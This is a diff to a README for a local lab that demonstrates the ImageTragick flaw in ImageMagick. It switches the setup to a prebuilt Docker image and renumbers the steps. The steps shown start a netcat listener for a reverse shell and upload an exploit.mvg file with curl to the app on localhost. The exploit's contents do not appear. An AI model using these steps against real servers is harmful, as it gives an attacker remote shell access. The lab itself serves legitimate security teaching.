@@ -4,21 +4,17 @@ Run a containerised Flask app that relies on a version of ImageMagic that is vul
 
 ## Steps
 
-1. Build a docker image:
+1. Download this image and create a container:
 
-        $ docker build -t imagetragick .
+        $ docker run -d --name imagetragick -p 127.0.0.1:8080:8080 craighurley/docker-imagetragick
 
-2. Create a docker container:
-
-        $ docker run -d --name imagetragick -p 127.0.0.1:8080:8080 imagetragick
-
-3. Listen for the reverse shell:
+2. Listen for the reverse shell:
 
         $ nc -l -n -vvv -p 4443
 
-4. Edit the contents of `exploit.mvg` so that is uses the correct IP address that `nc` is listening on.
+3. Edit the contents of `exploit.mvg` so that it uses the correct IP address that `nc` is listening on.
 
-5. Upload exploit to vulnerable application:
+4. Upload exploit to vulnerable application:
 
         $ curl -v -F file=@exploit.mvg http://127.0.0.1:8080
 
